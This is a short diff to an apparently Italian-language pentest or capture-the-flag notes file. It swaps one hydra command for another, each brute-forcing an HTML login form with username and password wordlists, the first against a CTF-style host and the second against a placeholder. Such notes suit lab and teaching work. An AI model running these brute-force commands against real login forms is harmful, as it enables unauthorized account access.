@@ -3,7 +3,7 @@
 ## attacco a forza bruta di un form HTML
 
 ```
-hydra app.tan.ctfio.com http-form-post "/:username=^USER^&password=^PASS^:Invalid" -L usernames.txt -P passwords.txt -t 5 -w 6
+hydra test.bho https-form-post "/:user=^USER^&pass=^PASS^:Invalid" -L users.txt -P passw.txt -t 5 -w 6
 ```
 
 # link-o-grafia
